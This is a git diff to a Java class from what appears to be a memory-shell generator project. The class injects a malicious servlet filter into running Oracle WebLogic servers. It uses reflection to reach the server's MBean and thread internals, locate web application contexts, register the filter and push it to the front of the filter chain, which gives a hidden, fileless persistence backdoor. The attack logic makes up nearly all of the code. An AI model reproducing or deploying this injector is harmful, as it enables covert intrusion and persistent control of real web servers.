@@ -1,13 +1,17 @@
 package com.reajason.javaweb.memshell.injector.weblogic;
 
+import javax.management.MBeanServer;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.PrintStream;
-import java.lang.reflect.Array;
+import java.lang.management.ManagementFactory;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.*;
+import java.util.HashSet;
+import java.util.List;
+import java.util.Map;
+import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -75,93 +79,38 @@ public class WebLogicFilterInjector {
         return c + "(" + r + ")";
     }
 
-    public static Object[] getContextsByMbean() throws Throwable {
-        Set<Object> webappContexts = new HashSet<Object>();
-        Class<?> serverRuntimeClass = Class.forName("weblogic.t3.srvr.ServerRuntime");
-        Class<?> webAppServletContextClass = Class.forName("weblogic.servlet.internal.WebAppServletContext");
-        Method theOneMethod = serverRuntimeClass.getMethod("theOne");
-        theOneMethod.setAccessible(true);
-        Object serverRuntime = theOneMethod.invoke(null);
-        Method getApplicationRuntimesMethod = serverRuntime.getClass().getMethod("getApplicationRuntimes");
-        getApplicationRuntimesMethod.setAccessible(true);
-        Object applicationRuntimes = getApplicationRuntimesMethod.invoke(serverRuntime);
-        int applicationRuntimeSize = Array.getLength(applicationRuntimes);
-        for (int i = 0; i < applicationRuntimeSize; i++) {
-            Object applicationRuntime = Array.get(applicationRuntimes, i);
-            try {
-                Method getComponentRuntimesMethod = applicationRuntime.getClass().getMethod("getComponentRuntimes");
-                Object componentRuntimes = getComponentRuntimesMethod.invoke(applicationRuntime);
-                int componentRuntimeSize = Array.getLength(componentRuntimes);
-                for (int j = 0; j < componentRuntimeSize; j++) {
-                    Object context = getFieldValue(Array.get(componentRuntimes, j), "context");
-                    if (webAppServletContextClass.isInstance(context)) {
-                        webappContexts.add(context);
-                    }
-                }
-            } catch (Throwable ignored) {
-            }
-
-            try {
-                Set<Object> childrenSet = (Set<Object>) getFieldValue(applicationRuntime, "children");
-                for (Object componentRuntime : childrenSet) {
-                    try {
-                        Object context = getFieldValue(componentRuntime, "context");
-                        if (webAppServletContextClass.isInstance(context)) {
-                            webappContexts.add(context);
-                        }
-                    } catch (Throwable ignored) {
-                    }
-                }
-            } catch (Throwable ignored) {
-            }
-        }
-        return webappContexts.toArray();
-    }
-
-    public static Object[] getContextsByThreads() throws Throwable {
-        Set<Object> webappContexts = new HashSet<Object>();
-        Set<Thread> threads = Thread.getAllStackTraces().keySet();
-        for (Thread thread : threads) {
-            if (thread != null) {
-                Object workEntry = getFieldValue(thread, "workEntry");
-                if (workEntry != null) {
-                    try {
-                        Object context = null;
-                        Object connectionHandler = getFieldValue(workEntry, "connectionHandler");
-                        if (connectionHandler != null) {
-                            Object request = getFieldValue(connectionHandler, "request");
-                            if (request != null) {
-                                context = getFieldValue(request, "context");
-                            }
-                        }
-                        if (context == null) {
-                            context = getFieldValue(workEntry, "context");
-                        }
-
-                        if (context != null) {
-                            webappContexts.add(context);
-                        }
-                    } catch (Throwable ignored) {
-                    }
-                }
-            }
-        }
-        return webappContexts.toArray();
-    }
-
     /**
      * weblogic.servlet.internal.WebAppServletContext
      * /opt/oracle/wls1036/server/lib/weblogic.jar
      * /u01/oracle/wlserver/modules/com.oracle.weblogic.servlet.jar
      */
-    public static Set<Object> getContext() {
+    public static Set<Object> getContext() throws Exception {
         Set<Object> webappContexts = new HashSet<Object>();
-        try {
-            webappContexts.addAll(Arrays.asList(getContextsByMbean()));
-        } catch (Throwable ignored) {
+        MBeanServer platformMBeanServer = ManagementFactory.getPlatformMBeanServer();
+        Map<String, Object> objectsByObjectName = (Map<String, Object>) getFieldValue(platformMBeanServer, "objectsByObjectName");
+        for (Map.Entry<String, Object> entry : objectsByObjectName.entrySet()) {
+            String key = entry.getKey();
+            if (key.contains("Type=WebAppComponentRuntime")) {
+                Object value = entry.getValue();
+                Object managedResource = getFieldValue(value, "managedResource");
+                if (managedResource != null && managedResource.getClass().getSimpleName().equals("WebAppRuntimeMBeanImpl")) {
+                    webappContexts.add(getFieldValue(managedResource, "context"));
+                }
+            }
         }
         try {
-            webappContexts.addAll(Arrays.asList(getContextsByThreads()));
+            Object workEntry = getFieldValue(Thread.currentThread(), "workEntry");
+            Object request = null;
+            try {
+                Object connectionHandler = getFieldValue(workEntry, "connectionHandler");
+                request = getFieldValue(connectionHandler, "request");
+            } catch (Exception x) {
+                // WebLogic 10.3.6
+                request = workEntry;
+            }
+            if (request != null) {
+                webappContexts.add(getFieldValue(request, "context"));
+            }
         } catch (Throwable ignored) {
         }
         return webappContexts;
@@ -193,20 +142,14 @@ public class WebLogicFilterInjector {
 
     @SuppressWarnings("unchecked")
     public void inject(Object context, Object filter) throws Exception {
-        Map filters = (Map) getFieldValue(getFieldValue(context, "filterManager"), "filters");
-        for (Object obj : filters.keySet()) {
-            if (obj.toString().contains(getClassName())) {
-                return;
-            }
-        }
         Object filterManager = invokeMethod(context, "getFilterManager", null, null);
-        Object servletClassLoader = invokeMethod(context, "getServletClassLoader", null, null);
-        Map<String, Class<?>> cachedClasses = (Map<String, Class<?>>) getFieldValue(servletClassLoader, "cachedClasses");
-        cachedClasses.put(getClassName(), filter.getClass());
+        if (((Map) getFieldValue(filterManager, "filters")).containsKey(getClassName())) {
+                return;
+        }
         invokeMethod(filterManager, "registerFilter", new Class[]{String.class, String.class, String[].class, String[].class, Map.class, String[].class}, new Object[]{getClassName(), getClassName(), new String[]{getUrlPattern()}, null, null, new String[]{"REQUEST", "FORWARD", "INCLUDE", "ERROR"}});
         List<Object> filterPatternList = (List<Object>) getFieldValue(filterManager, "filterPatternList");
-        Object currentMapping = filterPatternList.remove(filterPatternList.size() - 1);
-        filterPatternList.add(0, currentMapping);
+        Object curFilterInfo = filterPatternList.remove(filterPatternList.size() - 1);
+        filterPatternList.add(0, curFilterInfo);
     }
 
     @Override
